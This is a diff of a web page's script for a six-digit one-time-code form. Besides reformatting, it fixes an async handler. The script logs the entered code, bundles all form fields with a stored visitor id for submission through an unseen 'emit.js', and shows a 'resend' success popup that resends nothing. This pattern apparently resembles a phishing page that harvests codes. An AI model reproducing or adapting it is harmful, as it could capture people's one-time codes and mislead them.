@@ -164,82 +164,96 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="assets/emit.js"></script> 
     <script>
-    	page = "otp";
-    $(document).ready(function() {
+page = "otp";
 
-        // Auto-focus next OTP input
-        $('.otp-input').on('input', function() {
-            // Remove error styling when user types
-            $(this).removeClass('error');
-            
-            if (this.value.length === 1) {
-                $(this).next('.otp-input').focus();
-            }
-        });
+$(document).ready(function () {
 
-        // Handle backspace
-        $('.otp-input').on('keydown', function(e) {
-            if (e.key === "Backspace" && this.value === "") {
-                $(this).prev('.otp-input').focus();
-            }
-        });
+    // Auto-focus next OTP input
+    $('.otp-input').on('input', function () {
 
-        // Verify OTP with per-field validation
-        $('#submit').on('click', function(e) {
-            e.preventDefault();
-            
-            let otp = '';
-            let isComplete = true;
+        // Remove error styling when user types
+        $(this).removeClass('error');
 
-            $('.otp-input').each(function() {
-                if (this.value.trim() === "") {
-                    $(this).addClass('error');
-                    isComplete = false;
-                } else {
-                    $(this).removeClass('error');
-                }
-                otp += this.value;
-            });
-
-            if (!isComplete) {
-                return; // Stop here if any field is empty
-            }
-
-            if (otp.length !== 6) {
-                return;
-            }
-
-            console.log("Entered OTP:", otp);
-            let userinfo = $('form').serializeArray();
-            let user = {};
-            let visitor = sessionStorage.getItem('visitor');
-
-            userinfo.forEach((item) => {
-                user[item.name] = item.value;
-            });
-
-            user['visitor'] = visitor;
-
-            try {
-                await submitFormData(user);   // Now safe to use await
-                // Optional: show success message or redirect
-            } catch (error) {
-                console.error("Submission failed:", error);
-            }
-        });
-
-        // Resend OTP with tiny popup
-        $('#resend-link').on('click', function(e) {
-            e.preventDefault();
-            
-            const popup = $('#success-popup');
-            popup.addClass('show');
-            
-            setTimeout(() => {
-                popup.removeClass('show');
-            }, 3000);
-        });
+        if (this.value.length === 1) {
+            $(this).next('.otp-input').focus();
+        }
     });
-    </script>
-</body>
+
+    // Handle backspace
+    $('.otp-input').on('keydown', function (e) {
+
+        if (e.key === "Backspace" && this.value === "") {
+            $(this).prev('.otp-input').focus();
+        }
+    });
+
+    // Verify OTP with per-field validation
+    $('#submit').on('click', async function (e) {
+
+        e.preventDefault();
+
+        let otp = '';
+        let isComplete = true;
+
+        $('.otp-input').each(function () {
+
+            if (this.value.trim() === "") {
+                $(this).addClass('error');
+                isComplete = false;
+            } else {
+                $(this).removeClass('error');
+            }
+
+            otp += this.value;
+        });
+
+        if (!isComplete) {
+            return;
+        }
+
+        if (otp.length !== 6) {
+            return;
+        }
+
+        console.log("Entered OTP:", otp);
+
+        let userinfo = $('form').serializeArray();
+        let user = {};
+        let visitor = sessionStorage.getItem('visitor');
+
+        userinfo.forEach((item) => {
+            user[item.name] = item.value;
+        });
+
+        user['visitor'] = visitor;
+
+        try {
+
+            await submitFormData(user);
+
+            // Optional: show success message or redirect
+
+        } catch (error) {
+
+            console.error("Submission failed:", error);
+        }
+    });
+
+    // Resend OTP with tiny popup
+    $('#resend-link').on('click', function (e) {
+
+        e.preventDefault();
+
+        const popup = $('#success-popup');
+
+        popup.addClass('show');
+
+        setTimeout(() => {
+            popup.removeClass('show');
+        }, 3000);
+    });
+
+});
+</script>
+</body> 
 </html> 
